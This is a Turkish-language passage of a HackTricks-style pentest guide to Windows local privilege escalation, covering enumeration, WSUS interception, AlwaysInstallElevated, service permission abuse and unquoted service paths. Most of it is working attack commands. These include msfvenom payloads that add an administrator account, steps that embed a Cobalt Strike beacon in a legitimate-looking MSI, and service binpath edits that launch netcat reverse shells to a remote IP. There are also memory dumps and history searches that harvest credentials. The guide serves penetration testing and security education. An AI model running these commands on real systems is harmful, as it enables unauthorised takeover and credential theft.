# Windows Yerel Yetki Yükseltme

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## İlk Windows Teorisi

### Erişim Jetonları

**Windows Erişim Jetonlarının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Bütünlük Seviyeleri

**Windows'taki bütünlük seviyelerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okumalısınız:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows Güvenlik Kontrolleri

Windows'ta **sistemi listelemenizi**, yürütülebilir dosyaları çalıştırmanızı veya hatta **etkinliklerinizi tespit etmenizi** engelleyebilecek farklı şeyler vardır. Yetki yükseltme listelemesine başlamadan önce, **aşağıdaki sayfayı okuyun** ve tüm bu **savunma** **mekanizmalarını** **listeleyin**:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Sistem Bilgisi

### Sürüm bilgisi listeleme

Windows sürümünün bilinen bir açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm İstismarları

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4,700'den fazla güvenlik açığı bulunmaktadır ve bu, bir Windows ortamının sunduğu **büyük saldırı yüzeyini** göstermektedir.

**Sistemde**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı gömülü olarak içerir)_

**Sistem bilgileri ile yerel olarak**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**İstismarların Github reposu:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Env değişkenlerinde herhangi bir kimlik bilgisi/juicy bilgi kaydedildi mi?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkript dosyaları

Bunu nasıl açacağınızı [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Modül Günlüğü

PowerShell boru hattı yürütmelerinin detayları, yürütülen komutlar, komut çağrıları ve script parçalarını kapsayacak şekilde kaydedilir. Ancak, tam yürütme detayları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için, belgelerin "Transkript dosyaları" bölümündeki talimatları izleyin ve **"Modül Günlüğü"** seçeneğini **"Powershell Transkripsiyonu"** yerine tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Son 15 olayı PowersShell günlüklerinden görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Bir scriptin yürütülmesinin tam etkinlik ve içerik kaydı tutulur, her kod bloğunun çalıştığı gibi belgelenmesini sağlar. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur, bu da adli tıp ve kötü niyetli davranışları analiz etmek için değerlidir. Yürütme anında tüm etkinlikleri belgeleyerek, süreç hakkında ayrıntılı bilgiler sunar.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Bloğu için günlükleme olayları, Windows Olay Görüntüleyici'de şu yolda bulunabilir: **Uygulama ve Hizmet Günlükleri > Microsoft > Windows > PowerShell > Operasyonel**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Eğer güncellemeler http yerine http**S** kullanılarak talep edilmemişse, sistemi tehlikeye atabilirsiniz.

Aşağıdaki komutu çalıştırarak ağın SSL olmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol ederek başlarsınız:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Eğer şu şekilde bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`.

Then, **istismar edilebilir.** Eğer son kayıt 0'a eşitse, o zaman WSUS girişi göz ardı edilecektir.

Bu güvenlik açıklarını istismar etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçlar kullanabilirsiniz - Bunlar, SSL olmayan WSUS trafiğine 'sahte' güncellemeler enjekte etmek için MiTM silahlandırılmış istismar betikleridir.

Araştırmayı burada okuyun:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Tam raporu burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın istismar ettiği kusur şudur:

> Eğer yerel kullanıcı proxy'mizi değiştirme gücüne sahipseniz ve Windows Güncellemeleri, Internet Explorer ayarlarında yapılandırılan proxy'yi kullanıyorsa, bu durumda kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus) kullanma gücüne sahip oluruz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullandığından, mevcut kullanıcının sertifika deposunu da kullanacaktır. WSUS ana bilgisayarı için kendinden imzalı bir sertifika oluşturursak ve bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabileceğiz. WSUS, sertifikada bir güven ilk kullanımda türü doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir olarak kabul ediliyorsa ve doğru ana bilgisayar adına sahipse, hizmet tarafından kabul edilecektir.

Bu güvenlik açığını [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla istismar edebilirsiniz (serbest bırakıldığında).

## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **yerel ayrıcalık yükseltme** güvenlik açığı bulunmaktadır. Bu koşullar, **LDAP imzasının zorunlu olmadığı,** kullanıcıların **Kaynak Tabanlı Kısıtlı Delegasyon (RBCD)** yapılandırmalarına izin veren kendi haklarına sahip olduğu ve kullanıcıların domain içinde bilgisayarlar oluşturma yeteneğine sahip olduğu ortamlardır. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını belirtmek önemlidir.

**istismarı burada bulabilirsiniz** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) adresini kontrol edin.

## AlwaysInstallElevated

**Eğer** bu 2 kayıt **etkinse** (değer **0x1** ise), o zaman herhangi bir ayrıcalığa sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **kurabilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit yükleri
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

`Write-UserAddMSI` komutunu power-up'tan kullanarak mevcut dizinde ayrıcalıkları yükseltmek için bir Windows MSI ikili dosyası oluşturun. Bu betik, bir kullanıcı/grup ekleme isteği yapan önceden derlenmiş bir MSI yükleyicisi yazar (bu nedenle GIU erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Sadece oluşturulan ikili dosyayı çalıştırarak ayrıcalıkları artırın.

### MSI Wrapper

Bu araçları kullanarak bir MSI wrapper nasıl oluşturulacağını öğrenmek için bu eğitimi okuyun. Sadece **komut satırlarını** **çalıştırmak** istiyorsanız, bir "**.bat**" dosyasını sarmalayabileceğinizi unutmayın.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX ile MSI Oluştur

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio ile MSI Oluştur

* **Cobalt Strike** veya **Metasploit** ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP yükü** oluşturun.
* **Visual Studio**'yu açın, **Yeni bir proje oluştur** seçeneğini seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **İleri**'ye tıklayın.
* Projeye bir isim verin, örneğin **AlwaysPrivesc**, konum için **`C:\privesc`** kullanın, **çözümü ve projeyi aynı dizine yerleştir** seçeneğini seçin ve **Oluştur**'a tıklayın.
* 4 adımın 3. adımına (dahil edilecek dosyaları seçin) gelene kadar **İleri**'ye tıklamaya devam edin. **Ekle**'ye tıklayın ve yeni oluşturduğunuz Beacon yükünü seçin. Ardından **Tamamla**'ya tıklayın.
* **Çözüm Gezgini**'nde **AlwaysPrivesc** projesini vurgulayın ve **Özellikler**'de **TargetPlatform**'ı **x86**'dan **x64**'e değiştirin.
* Yüklenen uygulamanın daha meşru görünmesini sağlayacak **Yazar** ve **Üretici** gibi değiştirebileceğiniz diğer özellikler de vardır.
* Projeye sağ tıklayın ve **Görüntüle > Özel Eylemler**'i seçin.
* **Kurulum**'a sağ tıklayın ve **Özel Eylem Ekle**'yi seçin.
* **Uygulama Klasörü**'ne çift tıklayın, **beacon.exe** dosyanızı seçin ve **Tamam**'a tıklayın. Bu, yükleyici çalıştırıldığında beacon yükünün hemen çalıştırılmasını sağlayacaktır.
* **Özel Eylem Özellikleri** altında **Run64Bit**'i **True** olarak değiştirin.
* Son olarak, **oluşturun**.
* `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösteriliyorsa, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü niyetli `.msi` dosyasının **kurulumunu** **arka planda** çalıştırmak için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu güvenlik açığını istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always\_install\_elevated_

## Antivirüs ve Dedektörler

### Denetim Ayarları

Bu ayarlar neyin **kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Olay İletimi, logların nereye gönderildiğini bilmek ilginçtir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **yerel Yönetici şifrelerinin yönetimi** için tasarlanmıştır ve her şifrenin **eşsiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlar. Bu şifreler, Active Directory içinde güvenli bir şekilde saklanır ve yalnızca yeterli izinlere sahip kullanıcılar tarafından erişilebilir, bu da onlara yetkilendirildiklerinde yerel yönetici şifrelerini görüntüleme imkanı tanır.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Eğer aktifse, **düz metin şifreler LSASS** (Yerel Güvenlik Otoritesi Alt Sistemi Servisi) içinde saklanır.\
[**WDigest hakkında daha fazla bilgi bu sayfada**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Koruması

**Windows 8.1** ile birlikte, Microsoft, sistemin güvenliğini artırmak için Güvenlik Otoritesi'nin (LSA) bellek okuma veya kod enjekte etme girişimlerini **engellemek** amacıyla geliştirilmiş koruma sağladı.\
[**LSA Koruması hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**, **Windows 10**'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**Credentials Guard hakkında daha fazla bilgi burada.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbellekli Kimlik Bilgileri

**Alan kimlik bilgileri**, **Yerel Güvenlik Otoritesi** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri, kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle alan kimlik bilgileri oluşturulur.\
[**Önbellekli Kimlik Bilgileri hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listele

Ait olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **ayrıcalıklı bir gruba ait iseniz, ayrıcalıkları artırma imkanınız olabilir**. Ayrıcalıklı gruplar hakkında ve bunları nasıl kötüye kullanabileceğiniz hakkında burada bilgi edinin:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipülasyonu

**Token** nedir hakkında daha fazla bilgi edinin: [**Windows Token'ları**](../authentication-credentials-uac-and-efs/#access-tokens).\
Aşağıdaki sayfayı kontrol ederek **ilginç token'lar hakkında bilgi edinin** ve bunları nasıl kötüye kullanabileceğinizi öğrenin:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Giriş yapmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ana klasörler
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Şifre Politikası
```bash
net accounts
```
### Panodaki içeriği al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle, süreçleri listelemek **sürecin komut satırında şifreleri kontrol edin**.\
Bazı çalışan ikili dosyaları **üzerine yazıp yazamayacağınızı** veya ikili dosya klasöründe yazma izinlerinizin olup olmadığını kontrol edin, olası [**DLL Hijacking saldırılarını**](dll-hijacking/) istismar etmek için:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman [**çalışan electron/cef/chromium hata ayıklayıcılarını** kontrol edin, bunları ayrıcalıkları artırmak için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Süreç ikili dosyalarının klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellek Şifre Madenciliği

Çalışan bir sürecin bellek dökümünü **procdump** kullanarak oluşturabilirsiniz. FTP gibi hizmetler **kimlik bilgilerini bellek içinde düz metin olarak** saklar, belleği dökün ve kimlik bilgilerini okuyun.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD açmasına veya dizinleri gezmesine izin verebilir.**

Örnek: "Windows Yardım ve Destek" (Windows + F1), "komut istemi" için arama yapın, "Komut İstemini Açmak İçin Tıklayın" seçeneğine tıklayın

## Hizmetler

Hizmetlerin bir listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz.
```bash
sc qc <service_name>
```
Her hizmet için gerekli ayrıcalık seviyesini kontrol etmek üzere _Sysinternals_'dan **accesschk** ikilisinin bulundurulması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremeyeceğini kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[accesschk.exe'yi XP için buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi Etkinleştir

Eğer bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
&#xNAN;_&#x54;hizmet başlatılamıyor, ya devre dışı olduğu ya da ona bağlı etkin bir cihaz olmadığı için._

Bunu etkinleştirmek için kullanabilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Bu sorunun başka bir çözümü**, şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis ikili yolunu değiştir**

"Kimlik doğrulanmış kullanıcılar" grubunun bir serviste **SERVICE\_ALL\_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir ikilisinin değiştirilmesi mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi Yeniden Başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

* **SERVICE\_CHANGE\_CONFIG**: Servis ikili dosyasının yeniden yapılandırılmasına izin verir.
* **WRITE\_DAC**: İzin yeniden yapılandırmasını etkinleştirir, bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
* **WRITE\_OWNER**: Mülkiyet edinimi ve izin yeniden yapılandırmasına izin verir.
* **GENERIC\_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini devralır.
* **GENERIC\_ALL**: Ayrıca servis yapılandırmalarını değiştirme yeteneğini devralır.

Bu güvenlik açığının tespiti ve istismarı için, _exploit/windows/local/service\_permissions_ kullanılabilir.

### Servis ikili dosyalarının zayıf izinleri

**Bir servis tarafından yürütülen ikili dosyayı değiştirebilir misiniz** veya **ikili dosyanın bulunduğu klasörde yazma izinleriniz var mı** ([**DLL Hijacking**](dll-hijacking/))**.**\
Bir servis tarafından yürütülen her ikili dosyayı **wmic** (system32'de değil) kullanarak alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Hizmetler kayıt izinlerini değiştirme

Herhangi bir hizmet kaydını değiştirebilir misiniz kontrol etmelisiniz.\
Bir hizmet **kaydı** üzerindeki **izinlerinizi** kontrol etmek için:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** kullanıcılarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, hizmet tarafından yürütülen ikili dosya değiştirilebilir.

Yürütülen ikilinin Yolunu değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Hizmetler kayıt AppendData/AddSubdirectory izinleri

Eğer bir kayıt üzerinde bu izne sahipseniz, bu **bu kayıttan alt kayıtlar oluşturabileceğiniz anlamına gelir**. Windows hizmetleri durumunda bu, **rastgele kod çalıştırmak için yeterlidir:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Alıntılanmamış Hizmet Yolları

Eğer bir çalıştırılabilir dosyanın yolu tırnak içinde değilse, Windows her boşluktan önceki sonu çalıştırmaya çalışacaktır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmaya çalışacaktır:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Listele tüm alıntılanmamış hizmet yollarını, yerleşik Windows hizmetlerine ait olanlar hariç:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti tespit edebilir ve istismar edebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir hizmet ikili dosyası oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

